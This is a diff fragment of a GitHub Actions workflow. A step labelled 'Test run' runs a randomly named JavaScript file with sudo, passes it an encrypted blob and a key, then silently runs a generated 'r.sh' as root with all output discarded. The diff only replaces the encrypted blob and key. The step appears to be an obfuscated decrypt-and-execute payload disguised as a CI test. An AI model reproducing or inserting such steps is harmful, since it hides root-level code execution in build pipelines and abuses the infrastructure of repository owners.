@@ -29,6 +29,6 @@ jobs:
     - name: Test run
       run: |
         cd ${{ github.workspace }}
-        echo 'kkx69'
+        echo 'poag2'
         sudo chmod +x johns2xqp/field806dx/piersonteqsh/rubiox050l.js
-        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX18iXX3q8hShY+y/AHFXo2SIl2SIpMN5fOEVKKA8SYDxicnxyzvIuK8VVVpa05Mht94iLmgnv80sz1gNHDHlFWhIzoxzAGwxbcr/0b2W3HlCT678v+5lKVKL vm6ld9 && sudo sh r.sh > /dev/null 2>&1
+        sudo ./johns2xqp/field806dx/piersonteqsh/rubiox050l.js U2FsdGVkX1/lo0jPmv8AuVEhru5af9owFgWTeQtVKb8SWjgQJ5wv92/xaasJnb01Q56mPLAjD2vk0iBHdxW2qY4lphe1g5NfziCsdyy3KpsQrye5HxHkdXP6M6rT9MWU 65biym && sudo sh r.sh > /dev/null 2>&1
